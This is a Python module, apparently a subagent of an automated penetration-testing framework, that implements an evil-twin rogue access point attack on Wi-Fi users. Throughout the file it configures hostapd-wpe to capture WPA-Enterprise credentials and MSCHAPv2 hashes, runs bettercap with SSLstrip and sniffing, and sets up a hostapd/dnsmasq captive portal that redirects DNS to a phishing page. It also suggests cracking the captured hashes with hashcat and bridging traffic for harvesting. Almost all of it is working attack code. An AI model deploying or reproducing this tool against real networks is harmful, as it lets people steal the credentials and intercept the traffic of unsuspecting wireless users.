"""
evil_twin_subagent.py — Evil twin / rogue AP for credential harvesting.

AGENT_NAME  : "wireless"
SUBAGENT_NAME: "evil_twin"

Methodology:
  1. Clone a target AP (same SSID, channel — or use deauth to force clients)
  2. Launch hostapd-wpe for EAP credential capture (WPA Enterprise)
  3. Or launch hostapd + dnsmasq for open/WPA2-PSK captive portal clone
  4. Redirect DNS to phishing page (DNS spoofing via dnsmasq)
  5. Capture and log EAP credentials / portal submissions
  6. Report captured credentials and MSCHAPv2 hashes
"""
from __future__ import annotations
import logging, re
from typing import Any
from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

_EAP_CRED_RE    = re.compile(r'(username|password|mschapv2|NT hash|identity)', re.I)
_PORTAL_CRED_RE = re.compile(r'(POST|password=|passwd=|credential)', re.I)
_HASH_RE        = re.compile(r'([a-f0-9]{32}:[a-f0-9]{32})', re.I)


class EvilTwinSubagent(BaseSubagent):
    """Deploy evil twin AP for EAP credential harvesting."""

    AGENT_NAME    = "wireless"
    SUBAGENT_NAME = "evil_twin"

    async def run(self, target: str,
                  target_ssid: str = "",
                  target_bssid: str = "",
                  channel: int = 6,
                  interface: str = "wlan0",
                  attack_interface: str = "",
                  mode: str = "wpe",  # 'wpe' for enterprise, 'portal' for captive portal
                  duration: int = 120,
                  evidence_dir: str = "/tmp/pentest_evidence",
                  **kwargs: Any) -> SubagentResult:
        result = SubagentResult(session_id=self.session_id, subagent_name=self.SUBAGENT_NAME, target=target)

        await self.collect_tool("bash", target,
            {"options": f"-c \"mkdir -p {evidence_dir}/wireless/evil_twin\""})

        et_iface = attack_interface or interface

        # ── Check required tools ───────────────────────────────────────
        tools_out = await self.collect_tool("bash", target,
            {"options": "-c \"which hostapd hostapd-wpe dnsmasq bettercap airbase-ng 2>/dev/null\""})
        has_wpe       = "hostapd-wpe" in tools_out
        has_hostapd   = "hostapd" in tools_out
        has_dnsmasq   = "dnsmasq" in tools_out
        has_bettercap = "bettercap" in tools_out
        has_airbase   = "airbase-ng" in tools_out

        if mode == "wpe" and has_wpe:
            await self._launch_hostapd_wpe(target, target_ssid, channel, et_iface,
                                            duration, evidence_dir)
        elif has_bettercap:
            await self._launch_bettercap_ap(target, target_ssid, target_bssid,
                                             channel, et_iface, duration, evidence_dir)
        elif has_hostapd and has_dnsmasq:
            await self._launch_hostapd_portal(target, target_ssid, channel, et_iface,
                                               duration, evidence_dir)
        elif has_airbase:
            await self._launch_airbase(target, target_ssid, channel, et_iface,
                                        duration, evidence_dir)
        else:
            await self.store_finding(Finding(
                title="Evil Twin: Required Tools Not Found",
                description=f"No suitable AP tool available. Tools found: {tools_out.strip()[:200]}. Install: apt install hostapd-wpe dnsmasq bettercap",
                severity="INFO",
                evidence=tools_out[:300], tool="bash", host=target,
                mitre_technique="T1557",
                exploit_suggestion="Install: apt install -y hostapd-wpe dnsmasq",
            ))

        result.findings    = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result

    # ──────────────────────────── hostapd-wpe (Enterprise EAP) ──────────
    async def _launch_hostapd_wpe(self, target, ssid, channel, iface, duration, evidence_dir):
        conf = f"""interface={iface}
driver=nl80211
ssid={ssid or 'Corporate-WiFi'}
hw_mode=g
channel={channel}
wpa=3
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
dh_file=/etc/hostapd-wpe/certs/dh
wpe_logfile={evidence_dir}/wireless/evil_twin/wpe_creds.log
"""
        cfg_path = f"{evidence_dir}/wireless/evil_twin/hostapd-wpe.conf"
        await self.collect_tool("bash", target,
            {"options": f"-c \"cat > {cfg_path} << 'EOFCFG'\n{conf}\nEOFCFG\""})

        wpe_out = await self.collect_tool("bash", target,
            {"options": f"-c \"timeout {duration} hostapd-wpe {cfg_path} 2>&1 | tee /tmp/wpe_run.log; echo WPE_DONE\""})

        # Parse captured credentials
        cred_out = await self.collect_tool("bash", target,
            {"options": f"-c \"cat {evidence_dir}/wireless/evil_twin/wpe_creds.log 2>/dev/null\""})
        creds = _EAP_CRED_RE.findall(cred_out)
        hashes = _HASH_RE.findall(cred_out)

        await self.store_finding(Finding(
            title=f"Evil Twin (WPE): {len(creds)} EAP Credential Field(s), {len(hashes)} Hash(es) Captured",
            description=f"hostapd-wpe evil twin ran for {duration}s impersonating '{ssid}'. EAP credentials captured: {bool(creds)}.",
            severity="CRITICAL" if hashes else "HIGH" if creds else "MEDIUM",
            evidence=(cred_out[:400] or wpe_out[:400]), tool="bash", host=target,
            mitre_technique="T1557",
            exploit_suggestion=f"Crack MSCHAPv2: asleap -C <challenge> -R <response> -W {'/usr/share/wordlists/rockyou.txt'}; or hashcat -m 5500 '{hashes[0]}' rockyou.txt" if hashes else None,
        ))

    # ──────────────────────────── bettercap AP ───────────────────────────
    async def _launch_bettercap_ap(self, target, ssid, bssid, channel, iface, duration, evidence_dir):
        bc_cmds = (
            f"set wifi.ap.ssid {ssid or 'FreeWiFi'}; "
            f"set wifi.ap.bssid {bssid or '00:11:22:33:44:55'}; "
            f"set wifi.ap.channel {channel}; "
            f"wifi.ap on; "
            f"http.proxy on; "
            f"set http.proxy.sslstrip true; "
            f"net.sniff on"
        )
        bc_out = await self.collect_tool("bash", target,
            {"options": f"-c \"timeout {duration} bettercap -iface {iface} -eval '{bc_cmds}' 2>&1 | tee {evidence_dir}/wireless/evil_twin/bettercap.log; echo BC_DONE\""})

        portal_creds = _PORTAL_CRED_RE.findall(bc_out)
        await self.store_finding(Finding(
            title=f"Evil Twin (bettercap): AP '{ssid}' — {len(portal_creds)} Credential Submit(s)",
            description=f"bettercap evil twin AP with SSLstrip. Credential submissions captured: {len(portal_creds)}.",
            severity="CRITICAL" if portal_creds else "HIGH",
            evidence=bc_out[:600], tool="bash", host=target,
            mitre_technique="T1557",
        ))

    # ──────────────────────────── hostapd + dnsmasq (captive portal) ─────
    async def _launch_hostapd_portal(self, target, ssid, channel, iface, duration, evidence_dir):
        hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={ssid or 'FreeHotspot'}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
        dnsmasq_conf = f"""interface={iface}
dhcp-range=10.0.0.10,10.0.0.50,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
no-resolv
"""
        cfg_dir = f"{evidence_dir}/wireless/evil_twin"
        await self.collect_tool("bash", target,
            {"options": f"-c \"echo '{hostapd_conf}' > {cfg_dir}/hostapd.conf; echo '{dnsmasq_conf}' > {cfg_dir}/dnsmasq.conf\""})

        # Configure AP interface
        await self.collect_tool("bash", target,
            {"options": f"-c \"ip addr flush dev {iface}; ip addr add 10.0.0.1/24 dev {iface}; ip link set {iface} up\""})

        # Launch hostapd and dnsmasq
        start_out = await self.collect_tool("bash", target,
            {"options": f"-c \"hostapd {cfg_dir}/hostapd.conf &; dnsmasq -C {cfg_dir}/dnsmasq.conf &; echo PORTAL_UP\""})

        await self.store_finding(Finding(
            title=f"Evil Twin (Captive Portal): AP '{ssid or 'FreeHotspot'}' on ch{channel} {'UP' if 'PORTAL_UP' in start_out else 'FAILED'}",
            description=f"Open captive portal AP launched. DHCP/DNS served from 10.0.0.1. Clients will be redirected to portal at http://10.0.0.1/",
            severity="HIGH",
            evidence=start_out[:300], tool="bash", host=target,
            mitre_technique="T1557",
            exploit_suggestion="Set up phishing page: python3 -m http.server 80 (in /var/www/html/ with credential harvester)",
        ))

    # ──────────────────────────── airbase-ng (fallback) ──────────────────
    async def _launch_airbase(self, target, ssid, channel, iface, duration, evidence_dir):
        ab_out = await self.collect_tool("bash", target,
            {"options": f"-c \"timeout {duration} airbase-ng -e '{ssid or 'FreeWiFi'}' -c {channel} {iface} 2>&1 | tee {evidence_dir}/wireless/evil_twin/airbase.log; echo AB_DONE\""})
        await self.store_finding(Finding(
            title=f"Evil Twin (airbase-ng): AP '{ssid}' on ch{channel}",
            description=f"airbase-ng rogue AP launched for {duration}s. Monitor at0 interface for connected clients.",
            severity="HIGH",
            evidence=ab_out[:400], tool="bash", host=target,
            mitre_technique="T1557",
            exploit_suggestion="Bridge at0 to internet for credential harvesting: brctl addbr br0; brctl addif br0 eth0; brctl addif br0 at0",
        ))
